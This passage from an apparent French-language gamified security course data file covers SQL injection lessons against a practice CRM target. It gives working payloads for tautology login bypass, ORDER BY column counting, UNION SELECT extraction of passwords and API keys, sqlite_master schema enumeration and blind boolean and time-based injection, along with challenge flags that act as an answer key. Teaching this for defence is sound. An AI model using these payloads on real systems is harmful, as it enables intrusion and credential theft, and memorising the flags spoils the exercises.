          <text x="107" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Standard SQL / SQLite</text>
          <rect x="210" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
          <text x="292" y="50" fill="#fbbf24" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold"># ou /*...*/</text>
          <text x="292" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">MySQL / MariaDB</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- Contournement sans chiffre via égalité de chaînes :" },
          { num: 2, text: "SELECT * FROM users WHERE user = '' OR 'a'='a' -- ' AND pass = '...';", isCritical: true, note: "'a'='a' est une tautologie qui remplace parfaitement 1=1 pour tromper les filtres" },
          { num: 3, text: "-- L'authentification est validée" }
        ],
        prompt: "Clique sur la requête utilisant la variante avec égalité de chaînes 'a'='a' :"
      },
      tokenPuzzle: {
        instruction: "Assemble le payload alternatif avec tautologie alphabétique :",
        tokens: ["'", "OR", "'a'='a'", "--"],
        correctOrder: ["'", "OR", "'a'='a'", "--"]
      },
      quickQuiz: {
        prompt: "Pourquoi un pentesteur utilise-t-il la variante '' OR 'a'='a' au lieu de '' OR 1=1 ?",
        options: [
          { text: "Pour contourner des filtres de sécurité ou WAF naïfs qui recherchent spécifiquement la chaîne '1=1'.", isCorrect: true, debrief: "Exact ! Les WAF basés sur des signatures simples bloquent 1=1 mais laissent passer 'a'='a'." },
          { text: "Parce que le chiffre 1 est interdit par le standard SQL moderne.", isCorrect: false, debrief: "Faux. 1 est un entier parfaitement valide en SQL." },
          { text: "Parce que cette variante exécute la requête deux fois plus vite.", isCorrect: false, debrief: "Faux. La différence de vitesse d'exécution est négligeable." },
          { text: "Parce qu'elle force le serveur à passer en mode HTTPS.", isCorrect: false, debrief: "Faux. Le SQL ne gère pas la couche TLS du serveur." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, teste la variante ' OR 'a'='a' -- dans la recherche pour valider le bypass. Soumets le drapeau FLAG{...} qui s'affiche !",
      flag: 'FLAG{SQLI_UNION_EXTRACTED_CRM_DATA}'
    }
  },

  // 9. Déterminer le Nombre de Colonnes avec ORDER BY
  {
    id: 'm3-l9',
    unitId: 'm3',
    title: "9. Compter les Colonnes avec ORDER BY",
    icon: '🔢',
    xp: 45,
    lessonSlides: [
      {
        title: "Le Prérequis de l'Attaque UNION",
        bullets: [
          "Bypass un login est amusant, mais voler l'intégralité d'une autre table (comme les mots de passe) nécessite l'attaque suprême : **UNION SELECT**.",
          "Mais l'opérateur UNION a une règle d'airain intransigeante : **les deux requêtes doivent retourner EXACTEMENT le même nombre de colonnes** !",
          "Comment deviner combien de colonnes la requête originale du développeur extrait sans avoir accès au code source ?"
        ]
      },
      {
        title: "La Technique ORDER BY",
        bullets: [
          "`ORDER BY N` trie les résultats selon la colonne numéro N.",
          "Si tu testes `ORDER BY 1`, ça marche. `ORDER BY 2`, ça marche. `ORDER BY 3`, ça marche...",
          "Si tu tentes `ORDER BY 100`, la base plante en disant : *Column 100 does not exist !*.",
          "Le nombre de colonnes exact est donc le **dernier numéro qui ne déclenche aucune erreur** !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="30" width="80" height="60" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
          <text x="65" y="55" fill="#34d399" font-size="10" font-family="monospace" text-anchor="middle">ORDER BY 1</text>
          <text x="65" y="75" fill="#10b981" font-size="12" font-family="monospace" text-anchor="middle">✓ OK</text>
          <rect x="120" y="30" width="80" height="60" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
          <text x="160" y="55" fill="#34d399" font-size="10" font-family="monospace" text-anchor="middle">ORDER BY 3</text>
          <text x="160" y="75" fill="#10b981" font-size="12" font-family="monospace" text-anchor="middle">✓ OK</text>
          <rect x="215" y="30" width="80" height="60" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
          <text x="255" y="55" fill="#34d399" font-size="10" font-family="monospace" text-anchor="middle">ORDER BY 6</text>
          <text x="255" y="75" fill="#10b981" font-size="12" font-family="monospace" text-anchor="middle">✓ OK</text>
          <rect x="310" y="30" width="75" height="60" rx="8" fill="#0f172a" stroke="#f43f5e" stroke-width="2"/>
          <text x="347" y="55" fill="#f87171" font-size="10" font-family="monospace" text-anchor="middle">ORDER BY 7</text>
          <text x="347" y="75" fill="#f43f5e" font-size="12" font-family="monospace" text-anchor="middle">💥 Erreur !</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- Détermination du nombre de colonnes par dichotomie :" },
          { num: 2, text: "SELECT id, company, contact_name, contract_value, iban, memo FROM clients ORDER BY 6 --", isCritical: true, note: "ORDER BY 6 réussit, ce qui prouve que la requête initiale contient au moins 6 colonnes" },
          { num: 3, text: "-- ORDER BY 7 déclenche une erreur ➔ La requête a exactement 6 colonnes !" }
        ],
        prompt: "Clique sur la requête qui utilise ORDER BY pour sonder les colonnes :"
      },
      tokenPuzzle: {
        instruction: "Tape la clause ORDER BY de test pour valider 3 colonnes :",
        tokens: ["'", "ORDER BY 3", "--", "SELECT"],
        correctOrder: ["'", "ORDER BY 3", "--"]
      },
      quickQuiz: {
        prompt: "Comment la clause 'ORDER BY N --' permet-elle à un pentesteur de déduire le nombre exact de colonnes retournées par une requête ?",
        options: [
          { text: "En incrémentant N jusqu'à ce que la base renvoie une erreur indiquant que la colonne N n'existe pas.", isCorrect: true, debrief: "Exact ! Si ORDER BY 6 passe et que ORDER BY 7 plante, la table a exactement 6 colonnes." },
          { text: "En lisant le numéro de série de la carte mère du serveur.", isCorrect: false, debrief: "Faux. Le SQL ne donne pas d'informations sur la carte mère." },
          { text: "En demandant directement à l'administrateur par e-mail.", isCorrect: false, debrief: "Faux. L'attaquant cherche à déduire la structure sans intervention humaine." },
          { text: "En forçant la base à supprimer les colonnes paires.", isCorrect: false, debrief: "Faux. ORDER BY ne supprime rien, il trie." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, teste ' ORDER BY 3 -- pour confirmer que la table contient au moins 3 colonnes sans générer d'erreur. Soumets le nom de la première société cliente affichée !",
      flag: 'CyberDefense Systems'
    }
  },

  // 10. L'Attaque UNION SELECT : Fusionner Deux Requêtes
  {
    id: 'm3-l10',
    unitId: 'm3',
    title: "10. L'Attaque UNION SELECT : Vider la Base",
    icon: '💉',
    xp: 50,
    lessonSlides: [
      {
        title: "Fusionner Deux Tables : L'Opérateur UNION",
        bullets: [
          "L'opérateur SQL `UNION` permet de coller les résultats d'une **seconde requête arbitraire** en dessous des résultats de la première requête légitime.",
          "Si la première requête cherche des clients dans `crm_customers`, l'attaquant injecte un `UNION SELECT` pour extraire des mots de passe depuis `crm_accounts` !",
          "La page web affiche alors sur ton écran les secrets d'une table que le développeur n'avait jamais prévu de te montrer."
        ]
      },
      {
        title: "Respecter l'Alignement des Colonnes",
        bullets: [
          "Comme nous avons découvert que la table a 6 colonnes, notre requête injectée doit impérativement avoir 6 champs :",
          "`' UNION SELECT 1, username, password, 4, 5, secret_api_key FROM crm_accounts --`.",
          "Chaque colonne cible se glisse parfaitement dans l'affichage du CRM !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="20" width="350" height="35" rx="6" fill="#0f172a" stroke="#06b6d4"/>
          <text x="35" y="42" fill="#38bdf8" font-size="10" font-family="monospace">Req 1 : SELECT id, company, contact, ... FROM clients</text>
          <rect x="25" y="65" width="350" height="35" rx="6" fill="#030712" stroke="#10b981"/>
          <text x="35" y="87" fill="#34d399" font-size="10" font-family="monospace">UNION : SELECT 1, user, password, 4, 5, api_key FROM accounts</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- Extraction des comptes administrateurs via UNION SELECT :" },
          { num: 2, text: "' UNION SELECT 1, username, password, 4, 5, secret_api_key FROM crm_accounts --", isCritical: true, note: "UNION SELECT aligne les 6 colonnes pour déverser la table crm_accounts" },
          { num: 3, text: "-- Affiche : secops_admin | Pass_Ultra_Complex_#2026!$ | KEY{JWT_SECRET_...}" }
        ],
        prompt: "Clique sur la requête qui utilise UNION SELECT pour extraire crm_accounts :"
      },
      tokenPuzzle: {
        instruction: "Construis la requête UNION SELECT pour aligner les colonnes et extraire les comptes :",
        tokens: ["' UNION SELECT", "1, username, password, 4, 5, secret_api_key", "FROM crm_accounts --"],
        correctOrder: ["' UNION SELECT", "1, username, password, 4, 5, secret_api_key", "FROM crm_accounts --"]
      },
      quickQuiz: {
        prompt: "Quelle contrainte fondamentale doit impérativement être respectée pour qu'une injection UNION SELECT réussisse sans erreur ?",
        options: [
          { text: "La requête injectée doit retourner exactement le même nombre de colonnes que la requête d'origine.", isCorrect: true, debrief: "Exact ! Le moteur SQL exige une correspondance stricte du nombre de colonnes entre les deux requêtes de l'UNION." },
          { text: "L'ordinateur doit posséder au moins 64 Go de mémoire RAM.", isCorrect: false, debrief: "Faux. L'UNION fonctionne même avec très peu de mémoire." },
          { text: "Les deux tables doivent avoir été créées le même jour.", isCorrect: false, debrief: "Faux. La date de création des tables n'a aucune importance." },
          { text: "L'attaquant doit obligatoirement être connecté en administrateur root.", isCorrect: false, debrief: "Faux. L'injection s'exécute avec les privilèges de l'application web." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, injecte la requête UNION complète : ' UNION SELECT 1, username, password, 4, 5, secret_api_key FROM crm_accounts -- dans la recherche. Récupère la clé secrète JWT révélée et soumets la valeur KEY{...} !",
      flag: 'KEY{JWT_SECRET_SIGN_KEY_AEGIS_99}'
    }
  },

  // 11. Cartographier la Base de Données avec sqlite_master
  {
    id: 'm3-l11',
    unitId: 'm3',
    title: "11. Cartographier la Base : sqlite_master",
    icon: '🗺️',
    xp: 45,
    lessonSlides: [
      {
        title: "Comment Deviner le Nom des Tables ?",
        bullets: [
          "Dans un vrai test d'intrusion, personne ne te donne le nom des tables (`crm_accounts`). Tu es dans le noir total.",
          "Heureusement pour l'attaquant, tous les moteurs de base de données possèdent un annuaire interne décrivant leur propre architecture :",
          "• Sous SQLite : la table système s'appelle `sqlite_master`.",
          "• Sous MySQL / PostgreSQL : c'est la vue `information_schema.tables`."
        ]
      },
      {
        title: "Extraire le Schéma avec UNION",
        bullets: [
          "La colonne `name` de `sqlite_master` contient le nom de chaque table.",
          "La colonne `sql` contient le code exact ayant servi à créer la table avec toutes ses colonnes !",
          "En injectant : `' UNION SELECT 1, name, sql, 4, 5, 6 FROM sqlite_master WHERE type='table' --`, l'application déverse tout son plan d'architecture sous tes yeux."
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="350" height="70" rx="8" fill="#030712" stroke="#f59e0b" stroke-width="2"/>
          <text x="40" y="50" fill="#fbbf24" font-size="11" font-family="monospace" font-weight="bold">DICTIONNAIRE DU SYSTÈME :</text>
          <text x="40" y="70" fill="#94a3b8" font-size="10" font-family="monospace">sqlite_master ➔ Contient le nom de TOUTES les tables créées</text>
          <text x="40" y="85" fill="#38bdf8" font-size="9" font-family="monospace">Extraction des tables : crm_accounts, crm_customers...</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- Découverte des tables existantes dans la base SQLite :" },
          { num: 2, text: "' UNION SELECT 1, name, sql, 4, 5, 6 FROM sqlite_master WHERE type='table' --", isCritical: true, note: "sqlite_master est le catalogue interne stockant le schéma de la base" },
          { num: 3, text: "-- Révèle : crm_accounts | CREATE TABLE crm_accounts (id, username, password...)" }
        ],
        prompt: "Clique sur la requête qui extrait le schéma depuis sqlite_master :"
      },
      tokenPuzzle: {
        instruction: "Tape la requête pour extraire les noms de tables de sqlite_master :",
        tokens: ["' UNION SELECT 1, name,", "sql, 4, 5, 6", "FROM sqlite_master WHERE type='table' --"],
        correctOrder: ["' UNION SELECT 1, name,", "sql, 4, 5, 6", "FROM sqlite_master WHERE type='table' --"]
      },
      quickQuiz: {
        prompt: "Sous SQLite, quelle table système contient la liste de toutes les tables et leur structure SQL de création ?",
        options: [
          { text: "sqlite_master (le dictionnaire de métadonnées du schéma SQLite).", isCorrect: true, debrief: "Exact ! sqlite_master contient le schéma complet de toutes les tables du fichier." },
          { text: "sys.passwords", isCorrect: false, debrief: "Faux. Cette table n'existe pas sous SQLite." },
          { text: "/etc/passwd", isCorrect: false, debrief: "Faux. /etc/passwd est un fichier Linux, pas une table SQL." },
          { text: "root_table_registry", isCorrect: false, debrief: "Faux. Ce nom est inventé." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, injecte ' UNION SELECT 1, name, sql, 4, 5, 6 FROM sqlite_master WHERE type='table' -- pour découvrir les tables cachées. Soumets le nom de la table contenant les comptes administratifs !",
      flag: 'crm_accounts'
    }
  },

  // 12. Injections Aveugles (Blind SQLi)
  {
    id: 'm3-l12',
    unitId: 'm3',
    title: "12. Injections SQL Aveugles (Blind SQLi)",
    icon: '🕶️',
    xp: 50,
    lessonSlides: [
      {
        title: "Quand l'Application ne Répond Rien",
        bullets: [
          "Que faire si l'application est vulnérable à l'injection SQL mais n'affiche JAMAIS le résultat des requêtes à l'écran (ex: une page qui renvoie simplement 'Recherche terminée') ?",
          "C'est ce qu'on appelle une **Blind SQLi** (Injection SQL Aveugle).",
          "On ne peut pas lire directement les données, mais on peut poser des **questions fermées par Oui ou par Non** à la base !"
        ]
      },
      {
        title: "Injections Booléennes et Temporelles",
        bullets: [
          "• **Blind Booléenne** : on injecte `' AND (SELECT 1)=1 --`. Si le site affiche le résultat normal, la condition était VRAIE. Si la page est vide, la condition était FAUSSE.",
          "• **Blind Temporelle** : on demande à la base de faire une sieste : `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))) --`. Si le serveur met 5 secondes à répondre, notre condition est validée !",
          "Caractère par caractère, un script peut ainsi aspirer un mot de passe complet en testant son code binaire."
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="107" y="50" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">Blind Booléenne</text>
          <text x="107" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Page normale (VRAI)</text>
          <text x="107" y="85" fill="#f87171" font-size="9" font-family="monospace" text-anchor="middle">Page vide (FAUX)</text>
          <rect x="210" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
          <text x="292" y="50" fill="#fbbf24" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">Blind Temporelle</text>
          <text x="292" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">SLEEP(5)</text>
          <text x="292" y="85" fill="#34d399" font-size="9" font-family="monospace" text-anchor="middle">Délai de réponse de 5s</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- Test d'une condition aveugle booléenne VRAIE :" },
          { num: 2, text: "SELECT * FROM clients WHERE company LIKE '%Defense%' AND (SELECT 1)=1 --", isCritical: true, note: "Si la condition est vraie, le serveur renvoie le résultat normal" },
          { num: 3, text: "-- Test d'une condition aveugle FAUSSE : AND 1=2 ➔ Aucun résultat !" }
        ],
        prompt: "Clique sur la requête qui intègre une condition aveugle booléenne :"
      },
      tokenPuzzle: {
        instruction: "Tape la condition booléenne aveugle de test vrai (1)=1 :",
        tokens: ["Defense%'", "AND (SELECT 1)=1", "--", "SLEEP(5)"],
        correctOrder: ["Defense%'", "AND (SELECT 1)=1", "--"]
      },
      quickQuiz: {
        prompt: "Comment une injection SQL aveugle temporelle (Time-based Blind SQLi) permet-elle d'extraire des informations confidentielles ?",
        options: [
          { text: "En forçant la base à marquer une pause (ex: SLEEP) uniquement si une lettre du mot de passe testée est exacte, mesurant le temps de réponse.", isCorrect: true, debrief: "Exact ! Si la réponse met 5 secondes, l'attaquant sait que l'hypothèse testée était vraie." },
          { text: "En accélérant l'horloge système du serveur pour faire planter le système.", isCorrect: false, debrief: "Faux. SQL ne modifie pas l'horloge physique du processeur." },
          { text: "En envoyant un e-mail automatique contenant le mot de passe.", isCorrect: false, debrief: "Faux. Blind signifie qu'aucun canal direct n'est disponible." },
          { text: "En désactivant la batterie de sauvegarde de l'infrastructure.", isCorrect: false, debrief: "Faux. Le SQL est une couche logique applicative." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, teste l'injection booléenne ' AND (SELECT 1)=1 -- en recherchant 'Defense'. Vérifie que la société cliente s'affiche bien et soumets son nom exact !",
      flag: 'CyberDefense Systems'
    }
  },

  // 13. Boss Fight SQLi : Extraction Complète des Secrets Aegis
  {
    id: 'm3-l13',
    unitId: 'm3',
    title: "13. ★ BOSS FIGHT SQL : EXTRACTION TOTALE ★",
    icon: '👑',
    xp: 100,
    isBoss: true,
    lessonSlides: [
      {
        title: "L'Épreuve Finale de Maîtrise des Données",
        bullets: [
          "Tu es désormais un praticien aguerri des bases relationnelles et de l'exploitation SQLi :",
          "• Tu connais le modèle des tables, colonnes et lignes.",
          "• Tu maîtrises `SELECT` et le filtrage `WHERE`.",
          "• Tu comprends la concaténation fautive et l'erreur du guillemet `'`.",
          "• Tu sais contourner les authentifications avec `' OR 1=1 --`.",
          "• Tu sais compter les colonnes avec `ORDER BY` et fusionner deux requêtes avec `UNION SELECT`.",
          "Ta mission : extraire la clé cryptographique secrète de l'administrateur principal de la table `crm_accounts` !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="20" y="20" width="360" height="80" rx="10" fill="#030712" stroke="#f59e0b" stroke-width="2"/>
          <text x="200" y="55" fill="#fbbf24" font-size="14" font-family="monospace" text-anchor="middle" font-weight="bold">★ ÉPREUVE D'HOMOLOGATION SQLI PRO ★</text>
          <text x="200" y="75" fill="#94a3b8" font-size="11" font-family="monospace" text-anchor="middle">UNION SELECT ➔ Dump crm_accounts ➔ Extraction KEY</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "# Charge utile offensive finale UNION SELECT :" },
          { num: 2, text: "' UNION SELECT 1, username, password, 4, 5, secret_api_key FROM crm_accounts --", isCritical: true, note: "Dump intégral des comptes administratifs et des clés API confidentielles" },
          { num: 3, text: "secops_admin | KEY{JWT_SECRET_SIGN_KEY_AEGIS_99}" }
        ],
        prompt: "Clique sur la charge utile qui extrait les clés secrètes de crm_accounts :"
      },
      tokenPuzzle: {
        instruction: "Construis la charge utile finale pour extraire la clé API de crm_accounts :",
        tokens: ["' UNION SELECT", "1, username, password, 4, 5, secret_api_key", "FROM crm_accounts --"],
        correctOrder: ["' UNION SELECT", "1, username, password, 4, 5, secret_api_key", "FROM crm_accounts --"]
      },
      quickQuiz: {
        prompt: "Quelle est la seule et unique parade absolue définitive pour immuniser une application contre les injections SQL ?",
        options: [
          { text: "L'utilisation systématique de requêtes préparées avec paramètres liés (Prepared Statements / Parameterized Queries).", isCorrect: true, debrief: "Exactement ! Les requêtes préparées envoient la structure SQL et les données dans deux canaux séparés, rendant l'injection physiquement impossible." },
          { text: "Interdire les adresses IP provenant de l'étranger.", isCorrect: false, debrief: "Faux. L'injection peut provenir de n'importe quel réseau." },
          { text: "Remplacer SQLite par MySQL sans changer le code de concaténation.", isCorrect: false, debrief: "Faux. MySQL est tout aussi vulnérable si le code concatène." },
          { text: "Changer le mot de passe administrateur tous les lundis.", isCorrect: false, debrief: "Faux. L'injection SQL vole le nouveau mot de passe instantanément." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, applique une injection UNION SELECT pour extraire la clé secrète de secops_admin de la table crm_accounts. Soumets la valeur complète KEY{...} !",
      flag: 'KEY{JWT_SECRET_SIGN_KEY_AEGIS_99}'
    }
  }
];
